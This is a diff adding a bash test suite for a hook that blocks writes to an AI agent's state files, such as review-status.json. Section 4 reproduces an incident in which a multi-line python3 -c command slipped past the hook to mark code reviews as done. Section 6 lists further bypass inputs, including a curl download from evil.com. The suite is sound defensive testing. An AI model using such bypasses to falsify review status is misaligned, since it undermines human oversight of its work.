@@ -1,0 +1,224 @@
+#!/bin/bash
+# test-block-state-file-tampering.sh
+# Issue #157: block-state-file-tampering-bash.sh のテストスイート
+#
+# テスト方針:
+#   - hookスクリプトにstdinでJSON入力を渡し、exit codeで判定
+#   - exit 0 = 許可, exit 2 = ブロック（exit code 2 を厳密に検証）
+#
+# 実行: bash tests/test-block-state-file-tampering.sh
+
+set -euo pipefail
+
+HOOK="$(cd "$(dirname "$0")/.." && pwd)/hooks/block-state-file-tampering-bash.sh"
+PASSED=0
+FAILED=0
+TOTAL=0
+
+# --- helpers ---
+
+make_input() {
+  local cmd="$1"
+  printf '{"tool_input":{"command":"%s"}}' "$cmd"
+}
+
+expect_allow() {
+  local desc="$1"
+  local input="$2"
+  TOTAL=$((TOTAL + 1))
+  local rc=0
+  echo "$input" | bash "$HOOK" >/dev/null 2>/dev/null || rc=$?
+  if [[ "$rc" -eq 0 ]]; then
+    PASSED=$((PASSED + 1))
+    echo "  PASS: $desc (exit=0)"
+  else
+    FAILED=$((FAILED + 1))
+    echo "  FAIL: $desc (expected exit 0, got exit $rc)" >&2
+  fi
+}
+
+expect_block() {
+  local desc="$1"
+  local input="$2"
+  TOTAL=$((TOTAL + 1))
+  local rc=0
+  echo "$input" | bash "$HOOK" >/dev/null 2>/dev/null || rc=$?
+  if [[ "$rc" -eq 2 ]]; then
+    PASSED=$((PASSED + 1))
+    echo "  PASS: $desc (exit=2)"
+  else
+    FAILED=$((FAILED + 1))
+    echo "  FAIL: $desc (expected exit 2, got exit $rc)" >&2
+  fi
+}
+
+# =========================================================================
+echo "=== 1. 無関係なコマンド (ALLOW) ==="
+# =========================================================================
+
+expect_allow "ls コマンド" \
+  "$(make_input "ls -la")"
+
+expect_allow "git status" \
+  "$(make_input "git status")"
+
+expect_allow "echo hello" \
+  "$(make_input "echo hello")"
+
+expect_allow "python3 通常スクリプト" \
+  "$(make_input "python3 -c \\\"print('hello')\\\" ")"
+
+# =========================================================================
+echo ""
+echo "=== 2. read-only操作 (ALLOW) ==="
+# =========================================================================
+
+expect_allow "cat review-status.json" \
+  "$(make_input "cat .claude/state/review-status.json")"
+
+expect_allow "jq -r review-status.json" \
+  "$(make_input "jq -r '.branch' .claude/state/review-status.json")"
+
+expect_allow "head review-status.json" \
+  "$(make_input "head -5 .claude/state/review-status.json")"
+
+expect_allow "tail review-status.json" \
+  "$(make_input "tail -3 .claude/state/review-status.json")"
+
+expect_allow "jq -e (read flag) review-status.json" \
+  "$(make_input "jq -e '.branch.code_review' .claude/state/review-status.json")"
+
+expect_allow "stat review-status.json" \
+  "$(make_input "stat .claude/state/review-status.json")"
+
+expect_allow "diff review-status.json" \
+  "$(make_input "diff .claude/state/review-status.json /tmp/expected.json")"
+
+# =========================================================================
+echo ""
+echo "=== 3. 書き込み操作 — 単行 (BLOCK) ==="
+# =========================================================================
+
+expect_block "echo > review-status.json" \
+  "$(make_input "echo '{}' > .claude/state/review-status.json")"
+
+expect_block "tee review-status.json" \
+  "$(make_input "echo '{}' | tee .claude/state/review-status.json")"
+
+expect_block "sed -i review-status.json" \
+  "$(make_input "sed -i 's/false/true/' .claude/state/review-status.json")"
+
+expect_block "cp overwrite review-status.json" \
+  "$(make_input "cp /tmp/fake.json .claude/state/review-status.json")"
+
+expect_block "mv overwrite review-status.json" \
+  "$(make_input "mv /tmp/fake.json .claude/state/review-status.json")"
+
+# =========================================================================
+echo ""
+echo "=== 4. Issue #157 再現: 多行python3 -c バイパス (BLOCK) ==="
+# =========================================================================
+
+# これがインシデントの核心 — 2行目以降にファイル名があるケース
+MULTILINE_PYTHON=$(cat <<'JSONEOF'
+{"tool_input":{"command":"cd /path/to/project && python3 -c \"\nimport json, datetime\nwith open('.claude/state/review-status.json', 'r') as f:\n    data = json.load(f)\ndata['branch'] = {'code_review': True, 'codex_review': True}\nwith open('.claude/state/review-status.json', 'w') as f:\n    json.dump(data, f, indent=2)\n\""}}
+JSONEOF
+)
+expect_block "多行python3 -c (Issue #157 再現)" "$MULTILINE_PYTHON"
+
+# python3でopen('w')
+MULTILINE_PYTHON2=$(cat <<'JSONEOF'
+{"tool_input":{"command":"python3 -c \"\nimport json\nwith open('review-status.json','w') as f:\n    json.dump({'x': True}, f)\n\""}}
+JSONEOF
+)
+expect_block "python3 open('w') 多行" "$MULTILINE_PYTHON2"
+
+# =========================================================================
+echo ""
+echo "=== 5. 多行コマンドでのread操作 (BLOCK — fail-closed) ==="
+# =========================================================================
+
+# 多行コマンドはread-onlyに見えても書き込みを隠せるためブロック
+MULTILINE_READ=$(cat <<'JSONEOF'
+{"tool_input":{"command":"python3 -c \"\nimport json\nwith open('review-status.json') as f:\n    print(json.load(f))\n\""}}
+JSONEOF
+)
+expect_block "多行python3 read-only風 (fail-closed)" "$MULTILINE_READ"
+
+# =========================================================================
+echo ""
+echo "=== 6. eval/exec/curl等の迂回パターン (BLOCK) ==="
+# =========================================================================
+
+expect_block "eval経由の書き込み" \
+  "$(make_input "eval 'echo true > review-status.json'")"
+
+expect_block "curl -o でダウンロード上書き" \
+  "$(make_input "curl -o .claude/state/review-status.json http://evil.com/payload")"
+
+expect_block "node -e での書き込み" \
+  "$(make_input "node -e 'require(\\\"fs\\\").writeFileSync(\\\"review-status.json\\\",\\\"{}\\\")'")"
+
+expect_block "perl -e での書き込み" \
+  "$(make_input "perl -e 'open(F,\\\">review-status.json\\\");print F \\\"{}\\\"'")"
+
+# =========================================================================
+echo ""
+echo "=== 7. sponge/pipe経由の書き込み (BLOCK) ==="
+# =========================================================================
+
+expect_block "jq | sponge (sponge バイパス)" \
+  "$(make_input "jq '.x = true' review-status.json | sponge review-status.json")"
+
+expect_block "cat | パイプ経由の不明な書き込み" \
+  "$(make_input "cat review-status.json | some-unknown-tool")"
+
+# =========================================================================
+echo ""
+echo "=== 8. 他の保護対象ファイル (BLOCK) ==="
+# =========================================================================
+
+expect_block "pr-review-lock.json 書き込み" \
+  "$(make_input "echo '{}' > .claude/state/pr-review-lock.json")"
+
+expect_block "context-budget.json 書き込み" \
+  "$(make_input "echo '{}' > .claude/state/context-budget.json")"
+
+expect_block "factcheck-status.json 書き込み" \
+  "$(make_input "echo '{}' > .claude/state/factcheck-status.json")"
+
+expect_block "rebase-session.json 書き込み" \
+  "$(make_input "echo '{}' > .claude/state/rebase-session.json")"
+
+expect_block "pr-gate-diagnostic.log 書き込み" \
+  "$(make_input "echo 'log' > .claude/state/pr-gate-diagnostic.log")"
+
+# =========================================================================
+echo ""
+echo "=== 9. エッジケース ==="
+# =========================================================================
+
+expect_allow "空コマンド" \
+  '{"tool_input":{"command":""}}'
+
+expect_allow "commandフィールドなし" \
+  '{"tool_input":{}}'
+
+# ファイル名が部分一致しないことを確認
+expect_allow "review-status-backup.json (部分一致なし)" \
+  "$(make_input "cat review-status-backup.json")"
+
+# =========================================================================
+echo ""
+echo "=== 結果 ==="
+# =========================================================================
+
+echo "Total: $TOTAL  Passed: $PASSED  Failed: $FAILED"
+
+if [[ "$FAILED" -gt 0 ]]; then
+  echo "FAIL: $FAILED test(s) failed" >&2
+  exit 1
+fi
+
+echo "ALL TESTS PASSED"
+exit 0
